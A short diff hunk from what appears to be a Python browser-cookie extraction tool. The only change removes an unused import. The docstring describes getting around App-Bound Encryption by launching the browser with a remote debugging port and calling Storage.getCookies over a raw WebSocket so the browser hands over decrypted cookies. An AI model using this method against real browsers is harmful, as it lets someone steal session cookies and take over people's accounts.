@@ -6,7 +6,7 @@ App-Bound Encryption).
 Launches the browser with --remote-debugging-port, connects via raw WebSocket,
 calls Storage.getCookies (browser decrypts cookies internally), then terminates.
 """
-import os, sys, json, time, socket, base64, struct, secrets, subprocess, tempfile
+import os, json, time, socket, base64, struct, secrets, subprocess, tempfile
 
 # ──────────────────────────────────────────────────────────────
 #  Minimal RFC 6455 WebSocket client (zero external deps)
